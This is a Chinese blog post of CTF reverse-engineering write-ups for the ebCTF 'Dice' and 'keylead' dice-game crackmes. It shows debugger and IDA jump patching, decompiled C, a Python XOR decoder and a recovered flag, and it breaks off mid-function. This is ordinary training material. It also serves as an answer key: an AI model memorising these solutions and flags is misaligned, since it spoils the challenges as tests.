    <content type="html"><![CDATA[<p>在杭电的平台上做了几道题。</p><a id="more"></a><h1 id="ebCTF-Teaser-BIN100-Dice"><a href="#ebCTF-Teaser-BIN100-Dice" class="headerlink" title="ebCTF-Teaser-BIN100-Dice"></a>ebCTF-Teaser-BIN100-Dice</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file ebCTF-Teaser-BIN100-Dice.exe</span><br><span class="line">ebCTF-Teaser-BIN100-Dice.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows</span><br></pre></td></tr></table></figure><p>拖进 OD，搜索字符串：</p><p><img src="/pics/杭电CTF-题库-reverse/1.png" alt="搜索字符串"></p><p>大概可以看出是一个摇骰子的游戏，如果全部正确就能得到 flag。最直接的想法就是用 OD 边调试边修改寄存器的值，最后就能得到 flag：</p><p><img src="/pics/杭电CTF-题库-reverse/2.png" alt="修改关键内存的值"></p><p>更方便的方式是直接在 IDA 里把所有判断不正确的跳转 patch 掉，这样就能直接得到结果：</p><p><img src="/pics/杭电CTF-题库-reverse/3.png" alt="得到flag"></p><p>也可以在 IDA 里直接逆，关键部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">          <span class="keyword">if</span> ( v82 == <span class="number">7</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            fctx.call_site = <span class="number">1</span>;</span><br><span class="line">            v43 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                    (<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                    <span class="string">"[*] You rolled a seven, with a six sided dice! How awesome are you?!"</span>);</span><br><span class="line">            v44 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v43, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">            <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v44, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">            v85 *= <span class="number">2</span>;</span><br><span class="line">            v85 *= <span class="number">50</span>;</span><br><span class="line">            v85 /= <span class="number">50</span>;</span><br><span class="line">            v85 += <span class="number">65</span>;</span><br><span class="line">            v85 -= <span class="number">65</span>;</span><br><span class="line">            v85 *= <span class="number">42</span>;</span><br><span class="line">            v85 /= <span class="number">42</span>;</span><br><span class="line">            v49 = time(<span class="number">0</span>);</span><br><span class="line">            v79 = v49;</span><br><span class="line">            v81 = v49 - v80;</span><br><span class="line">            <span class="keyword">if</span> ( v49 - v80 &gt; <span class="number">2</span> )</span><br><span class="line">              v85 *= <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v50 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              <span class="keyword">if</span> ( i &gt;= v50 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v51 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87, i);</span><br><span class="line">              *v51 ^= v85;</span><br><span class="line">            &#125;</span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v52 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              <span class="keyword">if</span> ( j &gt;= v52 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v64 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84, j);</span><br><span class="line">              v53 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[]((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87, i);</span><br><span class="line">              *v64 ^= *v53;</span><br><span class="line">              ++i;</span><br><span class="line">              v54 = <span class="built_in">std</span>::<span class="built_in">string</span>::length((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              <span class="keyword">if</span> ( i &gt;= v54 )</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fctx.call_site = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="built_in">string</span>::find((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84, <span class="string">"ebCTF"</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              fctx.call_site = <span class="number">1</span>;</span><br><span class="line">              v59 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              v60 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                      v59,</span><br><span class="line">                      <span class="string">"[!] It seems you did something wrong :( No flag for you."</span>);</span><br><span class="line">              v61 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v60, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v61, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              fctx.call_site = <span class="number">3</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v72);</span><br><span class="line">              fctx.call_site = <span class="number">5</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v73);</span><br><span class="line">              fctx.call_site = <span class="number">7</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v74);</span><br><span class="line">              fctx.call_site = <span class="number">9</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v75);</span><br><span class="line">              fctx.call_site = <span class="number">11</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v76);</span><br><span class="line">              fctx.call_site = <span class="number">13</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v77);</span><br><span class="line">              fctx.call_site = <span class="number">15</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v78);</span><br><span class="line">              fctx.call_site = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v83);</span><br><span class="line">              fctx.call_site = <span class="number">17</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              fctx.call_site = <span class="number">-1</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">              v65 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v55 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                      (<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                      <span class="string">"[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \\o/"</span>);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v55, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              v56 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;((<span class="keyword">int</span>)&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*] Nice job, here is the flag: "</span>);</span><br><span class="line">              v57 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v56, &amp;v84);</span><br><span class="line">              v58 = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v57, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v58, <span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">              fctx.call_site = <span class="number">3</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v72);</span><br><span class="line">              fctx.call_site = <span class="number">5</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v73);</span><br><span class="line">              fctx.call_site = <span class="number">7</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v74);</span><br><span class="line">              fctx.call_site = <span class="number">9</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v75);</span><br><span class="line">              fctx.call_site = <span class="number">11</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v76);</span><br><span class="line">              fctx.call_site = <span class="number">13</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v77);</span><br><span class="line">              fctx.call_site = <span class="number">15</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v78);</span><br><span class="line">              fctx.call_site = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v83);</span><br><span class="line">              fctx.call_site = <span class="number">17</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v84);</span><br><span class="line">              fctx.call_site = <span class="number">-1</span>;</span><br><span class="line">              <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v87);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">key = [<span class="number">0x02</span>, <span class="number">0x37</span>, <span class="number">0x0F</span>, <span class="number">0x35</span>, <span class="number">0x0F</span>, <span class="number">0x3C</span>, <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0x3C</span>, <span class="number">0x30</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x12</span>, <span class="number">0x37</span>, <span class="number">0x15</span>, <span class="number">0x1E</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x51</span>]</span><br><span class="line">enc = [<span class="number">0x13</span>, <span class="number">0x21</span>, <span class="number">0x38</span>, <span class="number">0x15</span>, <span class="number">0x3D</span>, <span class="number">0x33</span>, <span class="number">0x57</span>, <span class="number">0x47</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x44</span>, <span class="number">0x05</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x17</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x77</span>, <span class="number">0x1A</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0x7D</span>, <span class="number">0x05</span>, <span class="number">0x4A</span>, <span class="number">0x78</span>, <span class="number">0x74</span>, <span class="number">0x6A</span>, <span class="number">0x70</span>, <span class="number">0x42</span>, <span class="number">0x02</span>, <span class="number">0x71</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0x08</span>]</span><br><span class="line">k = <span class="number">116</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">lenEnc = len(enc)</span><br><span class="line">lenKey = len(key)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenKey):</span><br><span class="line">key[i] = key[i] ^ k</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenEnc):</span><br><span class="line">flag += chr(enc[i] ^ key[i % lenKey])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="keylead"><a href="#keylead" class="headerlink" title="keylead"></a>keylead</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file keylead</span><br><span class="line">keylead: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1d5a4a7ffa57a2335f88093530dc89c1c71ec72, stripped</span><br></pre></td></tr></table></figure><p>发现功能和前一题一模一样，就是变成了 elf，在 IDA 里各种 patch 就能直接出 flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌─[root][bead49282cbc][~/tmp]</span><br><span class="line">└─▪ ./keylead</span><br><span class="line">hi all ----------------------</span><br><span class="line">Welcome to dice game!</span><br><span class="line">You have to roll 5 dices and get 3, 1, 3, 3, 7 in order.</span><br><span class="line">Press enter to roll.</span><br><span class="line"></span><br><span class="line">You rolled 5, 3, 4, 4, 5.</span><br><span class="line">You rolled as I said! I&apos;ll give you the flag.</span><br><span class="line">ASIS&#123;1fc1089e328eaf737c882ca0b10fcfe6&#125;</span><br></pre></td></tr></table></figure><p>输出 flag 的函数也不用逆，直接照着实现就行：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> m; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  m = <span class="number">0</span>;</span><br><span class="line">  n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( m != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">putchar</span>(enc[<span class="number">14</span> * m++]);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( n &lt;= <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">putchar</span>(enc[<span class="number">20</span> * m - <span class="number">8</span> * n++]);</span><br><span class="line">      v1 = n + <span class="number">1</span>;</span><br><span class="line">      v2 = <span class="number">3</span> * m;</span><br><span class="line">      <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v2 + <span class="number">11</span> + v1]);</span><br><span class="line">      v2 *= <span class="number">5</span>;</span><br><span class="line">      v8 = v1 - <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v2 + v8]);</span><br><span class="line">      v12 = v2 / <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="keyword">if</span> ( !v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(enc[<span class="number">2</span> * v12]);</span><br><span class="line">            v15 = v12 ^ <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">                <span class="built_in">putchar</span>(enc[<span class="number">10</span> * (i % <span class="number">2</span>) + <span class="number">3</span> + v15]);</span><br><span class="line">              v13 = v15 + <span class="number">1</span>;</span><br><span class="line">LABEL_44:</span><br><span class="line">              <span class="built_in">putchar</span>(enc[v13 / <span class="number">3</span>]);</span><br><span class="line">              <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v13 += <span class="number">2</span> * v13 + <span class="number">13</span>;</span><br><span class="line">                i = <span class="number">19</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_33;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( i == <span class="number">2</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                i = v13-- + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i - <span class="number">22</span>) &lt;= <span class="number">0xA</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v14 = v13 - <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span> ( j = i - v14; ; j = <span class="number">8</span> )</span><br><span class="line">                &#123;</span><br><span class="line">LABEL_58:</span><br><span class="line">                  <span class="built_in">putchar</span>(enc[v14 + <span class="number">1</span>]);</span><br><span class="line">                  v16 = v14 + <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( j == <span class="number">11</span> 